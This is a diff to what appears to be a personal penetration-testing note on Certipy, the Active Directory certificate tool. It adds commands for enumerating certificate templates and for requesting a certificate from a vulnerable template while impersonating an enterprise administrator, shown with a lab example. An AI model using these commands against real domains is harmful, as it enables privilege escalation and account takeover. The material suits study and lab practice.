@@ -5,9 +5,13 @@ tags:
 A tool used to generate certificates from a [[Active Directory Certificate Template|AD Certificate Template]].
 # Finding Certificates
 ```
-certipy find -u user@domain -p 'password' -dc-ip 10.0.1.16
+certipy find -u user@dns_name -p 'password' -dc-ip 10.0.1.16
 ```
 # Generation
+```
+certipy req -u <user> -p <password> -ca <CertificateAuthority> -target <CAHostname> -template <vulnTemplate> -upn <targetUsername> -dns <DNSServer
+```
+### Example
 ```
 certipy req -u Administrator@FCDomain.lab.micheal.com -dc-ip 10.100.119.28 -ns 10.100.5.53 -template TestVulnerableCertificate -upn EnterpriseAdmin@CDomain.lab.micheal.com -ca FC-CA01 
 ```
